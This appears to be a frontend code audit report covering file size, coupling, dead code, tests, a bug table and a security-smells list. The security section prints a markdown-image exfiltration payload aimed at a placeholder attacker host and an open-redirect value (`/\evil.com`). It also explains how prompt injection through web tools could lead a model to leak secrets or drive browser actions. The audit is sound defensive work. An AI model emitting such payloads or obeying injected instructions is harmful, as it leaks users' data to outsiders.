- **`isAppLink` / `isAppPath` / `safeLink` / login `next` check** ×4, all the same `startsWith('/') && !startsWith('//')`: lib/appLinks.ts:9, notifications/useServiceWorkerLinks.ts:5, public/sw.js:71, LoginPage.tsx:19.
- **Confirm dialogs**: consistent. All use `confirmDialog` / `promptDialog` / `chooseDialog` (21 files); there are no `window.confirm` calls. Radix Dialog is used directly (instead of `components/ui/Dialog`) in ZoomableImage, DiagramViewer, CommandPalette and AppLayout's drawer.
- **Picker dialogs**: `ChatPickerDialog` (chat/components/ChatReference.tsx:55), `TaskPickerDialog` (tasks/components/TaskStructure.tsx:248), `LinkPickerDialog` (documents) and `FileFinder` (links) share a search-list-pick pattern.
- **List + editor-dialog CRUD pages** repeat the same skeleton (header, list rows, ActionMenu, Dialog) across ProvidersPage, McpSettingsPage, ProfilesPage/Skills, AutomationsPage, NotificationSettingsPage, MemoryPage and ProjectsPage.
- **Project colour dot** `<span style={{backgroundColor}} …>` is inlined in about 6 places (Sidebar.tsx:135, ConversationPage.tsx:203, DocumentEditor.tsx:103, …).

---

## 5. God files and components

Files over 300 lines (excluding schema.d.ts and tests):

| Lines | File |
|---|---|
| 686 | features/music/player/controller.ts |
| 399 | features/agents/components/RunActivity.tsx |
| 380 | features/chat/pages/ConversationPage.tsx |
| 378 | features/files/FilesPage.tsx |
| 376 | features/chat/components/Composer.tsx |
| 333 | features/setup/SetupPage.tsx |
| 310 | features/chat/components/MessageBubble.tsx |
| 306 | app/Sidebar.tsx |

Next tier (250–300 lines): TaskStructure.tsx 282, youtube.ts 280, SharedPage.tsx 279, CalendarPage.tsx 276, chat/api.ts 270, NotificationSettingsPage.tsx 266, timer.ts 254, Island.tsx 251, EventDialog.tsx 251, WidgetGrid.tsx 250.

Components over about 150 lines (single function bodies), 11 in total:
- `Composer` 334 lines (Composer.tsx:43-376). It handles slash-skill menu, attachments, references, paste/drop, autosize and send.
- `ConversationPage` 298 lines (:82-380). It holds 9 mutations, 4 override states, a version viewer, header layout and an inline IIFE per message (:288-326).
- `CalendarPage` ~217 lines (:59-276).
- `Island` ~211 lines (:41-251).
- `TaskDialog` ~183 lines (TaskDialog.tsx:53).
- `TasksPage` ~180 lines (:40).
- `WidgetFrame` ~176 lines (WidgetGrid.tsx:31-206).
- `EventForm` ~175 lines (EventDialog.tsx:44).
- `BrowserView` ~160 lines (:37).
- `ChatsPage` ~158 lines (:75).
- `FilesPage` ~138 lines (:240-378), with 4 helper components above it.

Other big files:
- `RunActivity.tsx` is split into 7 local components; the largest are `PlanSection` (:286, ~65 lines) and `ToolRow` (:164, ~86 lines).
- `MessageBubble.tsx` has 6 local components; `AssistantMessage` is ~93 lines.
- `SetupPage.tsx` has 9 local components; `Setup` is ~73 lines.
- `Sidebar.tsx` has 10 small components.
- `controller.ts` mixes persisted store, runtime store, adapter wiring, resume-on-interrupt, skip budget, library sync, Media Session, link parsing and the `player` API (:459-662), with about 15 module-level mutable variables (:72-116, :288). It splits naturally into store.ts, library.ts, mediaSession.ts, buildTracks.ts and queue ops.

---

## 6. Coupling

**Circular imports (madge):**
1. `app/router.tsx → features/calendar/CalendarPage.tsx → features/tasks/components/TaskDialog.tsx → features/focus/focusOnTask.ts → app/router.tsx`. focusOnTask.ts:2 imports `router` to navigate outside React. At runtime the cycle passes through a lazy `import()`, but it is still a feature→app dependency.
2. `features/agents/components/RunActivity.tsx ↔ features/agents/components/SubagentRun.tsx` (recursive rendering).

**Feature-level two-way dependencies** (A imports B and B imports A):
- agents↔chat (agents → chat/runStream; chat → agents/api, ModeSwitch, RunActivity, question, shellOutput)
- agents↔runs
- chat↔runs
- chat↔browser
- chat↔memory
- documents↔tasks (documents → tasks/api; tasks → documents/RichEditor, markdown)
- documents↔shares (shares → documents/markdown; documents → shares/shareStore)
- files↔links
- links↔tasks
- focus↔tasks (tasks → focus/focusOnTask)
- island↔focus
- island↔music
- profiles↔skills (skills uses profiles' SkillDialog and SkillList; profiles uses skills icons)
- settings↔updates

**app ↔ features:**
- `app/projectStore.ts:3` imports `features/tasks/api`.
- 21 feature files import `@/app/projectStore` (calendar, chat, documents, files, focus, home ×9, links, projects, stats, tasks).
- `chat/pages/ConversationPage.tsx:6` imports `@/app/mobileNav`.
- `focus/focusOnTask.ts` imports `@/app/router`.

**Hub features (fan-out):**
- `home` imports 16 features.
- `chat` imports 17 (agents, automations, browser, focus, island, mcp, memory, music, notifications, profiles, providers, runs, settings, shares, shortcuts, skills, tasks). `chat/useAppEvents.ts` is the app-wide event bus and imports keys from 6 features. It would fit better in `app/` or a neutral `events/` module.
- `setup` imports notifications' NotificationSettingsPage (a whole page) plus providers' components.

**Deep internal imports.** Examples: `home → music/components/NowPlayingCard, PasteLinkForm, Artwork`; `home → focus/components/TimerDial, TaskPicker`; `home → stats/BarChart`; `runs → agents/components/RunActivity, RunControls`; `island → music/components/Artwork`. No feature exposes a public `index.ts`.

**Type escape hatches:**
- `as unknown as`: 3 in source (files/api.ts:126, settings/api.ts:43, music/player/youtube.ts:158) and 2 in tests.
- explicit `any`: 0.
- `@ts-ignore`, `@ts-expect-error`: 0.
- `eslint-disable-next-line react-hooks/exhaustive-deps`: 6 (DiagramBlock.tsx:47, focus/api.ts:46, TasksPage.tsx:97, ChatsPage.tsx:100, CalendarPage.tsx:113, DocumentEditor.tsx:81). Note: oxlint does not enable `exhaustive-deps`, so these comments are inert.
- `as EventListener` casts: about 18. Non-null `!`: a few (e.g. ConversationPage.tsx:346 `question.approval!.id`, normalizeLayout `r!.w`).
- **A literal NUL byte** sits in source at `features/documents/components/DocumentEditor.tsx:99` (`const NEW = '\0new'` written as a raw 0x00). It makes grep/ripgrep treat the file as binary. Replace it with the escape `'\u0000new'`; behaviour is identical.

---

## 7. Dead code candidates (knip output, each checked with grep including lazy `import()` and `import.meta.glob`)

High confidence, truly unreferenced:
- `features/providers/api.ts:115 useCreateModel`: defined, never referenced anywhere (POST /api/models is otherwise unused).
- `src/assets/hero.png`, `src/assets/vite.svg`: Vite template leftovers, no references in ts/tsx/css/html.

Exported but used only inside their own file (drop the `export`, keep the code):
- chartSpec.ts `CHART_TYPES`, `MAX_POINTS`, `MAX_SERIES`; colors.ts `readPalette`; exportImage.ts `svgFile`, `download`
- chat/chatActions.tsx `parseTags`; chat/tab.ts `reportUse`; documents/passage.ts `showPassage`
- focus/components/TimerDial.tsx `SessionDots`; focus/taskMatch.ts `OPEN_STATUSES`; focus/timer.ts `newSessionId`, `phaseMs`, `toggle`; focus/timerStore.ts `DEFAULT_PREFS`
- home/dailyNote.ts `cleanText`
- music/components/NowPlayingCard.tsx `LivePill`, `VolumeControl`; music/player/controller.ts `uid`, `copyTrack`
- search/actions.ts `ACTIONS`; search/pages.ts `PAGES`; settings/theme.ts `DEFAULT_APPEARANCE`, `resolveMode`
- shortcuts/ShortcutKeys.tsx `Kbd`; shortcuts/registry.ts `shortcut()`, `matchesCombo`
- tasks/components/TaskStructure.tsx `TaskPickerDialog`; tasks/repeat.ts `REPEAT_OPTIONS`
- key constants not imported elsewhere: `permissionSummaryKey`, `calendarKey`, `folderKey`, `memoriesKey`, `memorySummaryKey`, `destinationsKey`, `profilesKey`, `skillsKey`, `sharesKey`, `tasksKey`, `projectsKey`, `updatesKey`. Several of these duplicate inline arrays used elsewhere (§3), so prefer **using** them over un-exporting them.
- 38 unused exported **types** (e.g. `Turn`, `VersionNav`, `PlayerRuntime`, `Repeat`, `SectionLink`). These are harmless.

False positives (do not delete):
- `components/diagrams/math.ts remarkPlugins/rehypePlugins` (used through the lazy `import('./math')` namespace in useMath.ts:3 and Markdown.tsx).
- `mermaidRender.ts renderMermaid` (lazy `import('./mermaidRender')`, DiagramBlock.tsx:21).
- `public/sw.js` (loaded with `?raw` in notifications/sw.test.ts).
- All files under `/src` are also loaded by `import.meta.glob` in shortcuts/guard.test.ts.

Documentation-only registry entries (not dead; they feed the sheet): `app.close`, `chat.newline`, `chat.skill`.

---

## 8. Tests (vitest + jsdom, `src/test/setup.ts` = jest-dom)

43 files, 197 tests. They are mostly pure-logic tests with a few component tests:
- app/useSidebarSwipe (3)
- components:
  - diagrams/Markdown (6), diagrams (13: fence, dollars, chart parse, mermaidConfig)
  - ui/Lingering (3), controls (Slider, Segmented; 6), dialogs (3), toast (2)
- agents: PlanEditor (2), ShellCall (3)
- automations/scheduleForm (5)
- browser/input (4)
- chat: age (2), pastedFiles (3), questionMarks (5), remaining (2), runStream reducer (6)
- documents: passage (7), roundtrip (8, Tiptap↔Markdown), useAutosave (2)
- focus/timer (12, pure timer maths)
- home: dailyNote (7), layout (6)
- island/alerts (3)
- mcp/lines (5)
- music: player/controller (9: repeat, reload resume, skip budget, interrupt resume, reorder / playNext / remove-undo, add playlist link appends and autoplays when idle, playTracks replaces with shuffle), player/detect (6)
- notifications: push (8), sw (5, runs public/sw.js)
- search (5, pages, snippets, usage periods)
- settings/theme (3)
- setup/steps (5)
- shares/links (2)
- shortcuts: guard (4), registry (5)
- skills/slash (3)
- stats/ranges (2)
- tasks: dates (5), relations (5), repeat (2)
- hooks/useShiftHeld (2)
- lib: appLinks (2), citations (1), format (5)

**Features with no unit tests:** auth, calendar, files, links, memory, profiles, projects, providers, runs, updates, usage, web.

**Untested pieces in tested features:**
- no page or component tests for ConversationPage, Composer, MessageBubble, FilesPage, SetupPage, Sidebar, Island, WidgetGrid or CommandPalette;
- `timerStore` and `outbox` (the offline queue) are untested;
- `useAppEvents` is untested.

The repo also has 30 Playwright specs in `../e2e/tests/*.spec.ts` (agents, chat, files, focus, home, island, music, push, setup, shares, shortcuts, …). Those are the real safety net for a behaviour-preserving refactor.

---

## 9. Bugs noticed (not fixed)

| # | Sev | Location | Problem | Suggested fix |
|---|---|---|---|---|
| 1 | **Med** | app/router.tsx:40-44 + chat/pages/ConversationPage.tsx:89-123 | The `/c/:conversationId` element is reused when you switch chats (no `key`). `modelOverride`, `modeOverride`, `profileOverride`, `viewing`, `browserOpen`, and the **Composer draft text, attachments, references and chosen skill** carry over from chat A to chat B. A message typed in A can be sent to B with A's model or mode override. | Render `<ConversationPage key={conversationId}/>` from a small wrapper, or reset the state on id change. |
| 2 | Med | chat/components/Composer.tsx:110-118 (`send`) | Text, attachments and references are cleared **before** the send succeeds. On a network or 4xx error (ConversationPage `send.mutate`, NewChatPage `start`) the message is lost. | Clear on success, or let `onSend` return a promise and restore on failure. |
| 3 | Med | settings/useAppearanceSync.ts:14-19 + settings/api.ts:24 | `saveAppearance` never updates the `['settings']` cache. `useAppearanceSync` hydrates once per **mount** from cached data. Leaving AppLayout for `/browser/:id` (the phone path, ConversationPage.tsx:213) or remounting AppLayout re-hydrates from the stale cache, so the theme or accent you just chose reverts and is written to localStorage. | `setQueryData(settingsKey, …appearance)` after a save, or hydrate only once per app (module-level flag). |
| 4 | Low-Med | auth/reauthStore.ts:22 | Concurrent `withReauth` calls overwrite `pending`, so the first caller's promise never resolves and its button stays busy forever. | Keep a list of waiters, or reuse the in-flight request promise. |
| 5 | Low-Med | home/useHomeLayout.ts:38-40 | Unmount **clears** the pending 500 ms save, so a layout change made right before leaving Home is never saved (the cache shows it until the next refetch). | Flush on unmount instead of cancelling. |
| 6 | Low-Med | documents/useAutosave.ts:88-103 | The `pagehide` flush uses a normal fetch (`saveDocument` is api.PUT), which browsers may cancel on tab close, losing the last second of typing. | Use `keepalive: true` (openapi-fetch accepts fetch init) or `sendBeacon`. |
| 7 | Low-Med | auth/RequireAuth.tsx:23 | Any non-401 failure of `/api/auth/me` (server 500, offline PWA start) leaves `me.data` undefined and redirects to `/login` instead of showing an error or retrying. | Branch on `me.isError` (not 401) and show a retry screen. |
| 8 | Low | files/api.ts:123, documents/api.ts:118, links/api.ts:40, chat/useAttachments.ts:22 | Raw uploads bypass `unwrap`, so a 401 does not log the UI out. | Share an `uploadForm()` helper that calls the unauthorized listeners. |
| 9 | Low | chat/useAppEvents.ts:27-101, chat/runStream.ts:239, browser/useBrowserStream.ts:44 | Unguarded `JSON.parse` in SSE handlers: one malformed event throws inside the listener and skips the invalidations. | Use a safe-parse helper. |
| 10 | Low | chat/pages/ConversationPage.tsx:169 | `useStickToBottom([…])` gets a new array each render, so its `useLayoutEffect([dep])` runs on every render (re-pins on unrelated renders). | Pass primitives or a stable key. |
| 11 | Low | chat/pages/ConversationPage.tsx:130-139 | `onFinished` matches messages by `m.run_id === activeRunId` from the latest render. If `activeRunId` were already null, every message with `run_id === null` (user messages) would be overwritten. This is fragile, though currently guarded by stream closure ordering. | Capture the run id inside `useRunStream`. |
| 12 | Low | home/widgets/TodayWidget.tsx:34, TasksWidget.tsx:31 | `completed_at.slice(0,10) >= today` compares the UTC date of a timestamp with the local day, so "done today" is miscounted near midnight outside UTC. | Convert `completed_at` to a local day first. |
| 13 | Low | lib/format.ts:64 `formatUpcoming` | The day difference uses 86,400,000 ms blocks, so it mislabels Today/Tomorrow across DST changes (`dayLabel` in the same file already does it right). | Compare calendar days. |
| 14 | Low (likely) | focus/TimerEngine.tsx + timerStore.ts | Several tabs each run the clock. At phase end each may complete it from its own copy before the storage rehydrate arrives, giving duplicate chimes, island and desktop notices and `POST /api/focus/phase-ended` (sessions are de-duplicated by client_id, notices are not). Not reproduced. | Use leader election (BroadcastChannel / Web Locks). |
| 15 | Low | music/player/controller.ts:605 | `remove()` of the current track continues playback only if `status==='playing'`, so removing it while buffering stops the player. | Also accept 'buffering' (or `wantsPlayback`). |
| 16 | Low | music/player/detect.ts:~102 `audioTitle` | `decodeURIComponent` throws on malformed `%` sequences, so adding such a link fails with "URI malformed". | try/catch. |
| 17 | Low | music/api.ts:69-74 | The playlist delete Undo calls `api.POST` without `unwrap`/catch: failures are silent and the playlist gets a new id. | `unwrap` plus a toast on error. |
| 18 | Low | chat/pages/NewChatPage.tsx:41-48, home/widgets/AskWidget.tsx:32-38 | If create succeeds but the first turn fails, an empty chat is left behind. | Delete it on failure, or have the server create and send in one call. |
| 19 | Low | setup/SetupPage.tsx:256, :277; files/FilesPage.tsx:288 | Setup renders `null` forever if settings fail to load. `await save.mutateAsync` / `saveFile.mutateAsync` reject unhandled. | Error state; try/catch. |
| 20 | Low | public/sw.js:44 | `caches.match('/offline.html')` can resolve `undefined` (evicted cache), and `respondWith(undefined)` then fails as a network error. | Fall back to `new Response(...)`. |
| 21 | Low | notifications/desktop.ts:60 | `localStorage.removeItem` is not wrapped in try/catch (unlike everywhere else). | Wrap it. |
| 22 | Low | agents/shellOutput.ts | The `useShellOutput` map is never pruned (up to 64 KB per tool call for the whole session). | Clear entries when a run finishes or the conversation changes. |
| 23 | Info | chat/useAppEvents.ts:41-44 | `run.status` does not invalidate `['run', id]` (RunDetailPage depends on polling). The comment at :73 says "Tasks and calendar changed" but only tasks and projects are invalidated (the calendar's task layer works only because it reads `tasksKey`). | Make it consistent. |

---

## 10. Security smells (most serious first)

1. **Remote images in model output load automatically: zero-click exfiltration.** `components/ui/Markdown.tsx:95` uses react-markdown with no `img` override, so `![](https://attacker/?q=<secret>)` emitted by a model is fetched at once. That model may be acting on a web page or file planted by an attacker (prompt injection through the browser and web tools). The same renderer shows documents, task notes and public share pages (shares/SharedPage.tsx:69, 145, 270). The SPA has **no Content-Security-Policy** (the backend `spa()` in `../backend/app/main_api.py:85-103` sets only Cache-Control, plus Referrer-Policy for `/s/`). Fix:
   - an `img` component that allows only app paths and data/blob URLs, or click-to-load for remote ones;
   - a CSP with a restrictive `img-src` / `connect-src`.
2. **Third-party scripts injected into the app origin at runtime, with no CSP**:
   - `music/player/youtube.ts:58` loads `https://www.youtube.com/iframe_api`;
   - `music/player/soundcloud.ts:111` loads `https://w.soundcloud.com/player/api.js`.

   They run with full same-origin access and can call the cookie-authenticated `/api`. This is a supply-chain risk, and SRI is not possible. Consider hosting the players in a sandboxed iframe on a separate origin and talking to it over postMessage.
3. **Diagram SVG injection, the only `dangerouslySetInnerHTML`** (`components/diagrams/DiagramBlock.tsx:99`). It is well layered: Mermaid `securityLevel:'strict'`, `htmlLabels:false`, the `secure` lock list (mermaidConfig.ts:9-25), then DOMPurify with the SVG profile, `FORBID_TAGS` for foreignObject, image, script and so on, removal of non-`#` hrefs, and CSS `url()` and `@import` removal (sanitizeSvg.ts). Residual gap (unverified): `cleanCss` handles only `url(...)`. CSS `image-set("https://…")` / `-webkit-image-set` with string URLs would still fetch, if a diagram's `style`/`classDef` lets such a value through. Strip `image-set` too, or rely on a CSP.
4. **"Internal link" checks accept `/\host`**:
   - `lib/appLinks.ts:9` (`isAppLink`) and `Markdown.tsx:67`: such a link renders as a router `<Link>` without `rel`/`target`;
   - `notifications/useServiceWorkerLinks.ts:5`;
   - `public/sw.js:71` (`safeLink`, then `clients.openWindow`);
   - `features/auth/LoginPage.tsx:19` (`next`).

   Browsers normalise `/\evil.com` to `//evil.com`. In-page navigation throws a cross-origin `pushState` error, but open-in-new-tab and `openWindow` lead off-site. Severity is low (push payloads come from your own server; Markdown links are model-controlled). Reject a backslash after the leading slash, or parse with `new URL(x, location.origin)` and compare origins.
5. **Agent-controlled actions in the tab.** The SSE `music.control` (chat/useAppEvents.ts:28 → agentControl.ts:34) makes the browser fetch YouTube or SoundCloud oEmbed for any agent-supplied URL and play arbitrary audio URLs. `focus.control` starts the timer. Both are by design, but they are browser-side effects reachable through prompt injection. Low.
6. **Unescaped ids in URLs**: `runStream.ts:130` `/api/runs/${runId}/events`, `useBrowserStream.ts:36`, `ConversationPage.tsx:74` `window.open('/browser/${conversationId}')`, `links/api.ts:40`. Route params come from the address bar (`/c/x%3Fy` decodes to `x?y`). The effect is same-origin GET path manipulation only. Low; use `encodeURIComponent`.
7. **Link targets from tool data**: RunActivity.tsx:156 `<a href={l.url} target=_blank rel="noreferrer noopener">` (web results). React 19 blocks `javascript:` URLs, but there is no scheme allowlist. Low.
8. **Push approval tokens** are stored in the notification's `data` and posted with `credentials:'omit'` (sw.js:82-91, 107-133). Anyone who can tap the device's notification can approve a tool call. This is a documented design choice; noted for completeness.
9. **Positives (keep them)**:
   - KaTeX `trust:false`, `maxSize`/`maxExpand` (math.ts:17);
   - no `rehype-raw`;
   - external Markdown links get `noopener noreferrer`;
   - auth is an httpOnly same-origin cookie (`credentials:'same-origin'`, client.ts:13); **no tokens in localStorage or sessionStorage**;
   - the SW never caches `/api`;
   - the SW→page `postMessage` is validated and only listened to on `navigator.serviceWorker`;
   - attachments and file downloads are served with `CSP: default-src 'none'` by the backend (`../backend/app/features/files/router.py:151`, `attachments/router.py:57`);
   - artwork images use `referrerPolicy="no-referrer"`;
   - share pages get `Referrer-Policy: no-referrer`.
10. **localStorage contents** are non-secret (appearance, sidebar, project id, timer, outbox of focus sessions with task ids, music queue URLs, flags). They are readable by any script in the origin, which matters given item 2.
